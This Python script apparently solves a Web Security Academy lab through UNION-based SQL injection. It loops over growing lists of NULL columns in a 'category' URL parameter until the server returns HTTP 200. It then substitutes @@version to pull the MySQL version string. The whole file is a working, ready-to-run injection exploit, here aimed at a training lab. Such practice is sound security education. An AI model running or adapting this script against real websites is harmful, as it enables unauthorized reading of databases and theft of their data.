import requests

url = "https://0a25003a0305f870806b128100fc000a.web-security-academy.net/filter?category="
header = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.6045.159 Safari/537.36",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7"
}
sqli = "' UNION SELECT "
n = "NULL"
executedSqli = ""
while(True):
    payload = sqli + n + " #"
    n = n + ", NULL"
    attackUrl = url + payload
    response = requests.get(url=attackUrl, headers=header)
    if (response.status_code == 200):
        executedSqli = attackUrl
        break
for i in range(0, 3):
    versionSql = executedSqli.replace("NULL", "@@version", i)
    response = requests.get(url=versionSql, headers=header)
    if ("8.0.35-0ubuntu0.20.04.1" in response.text):
        print("You solve the lab!")


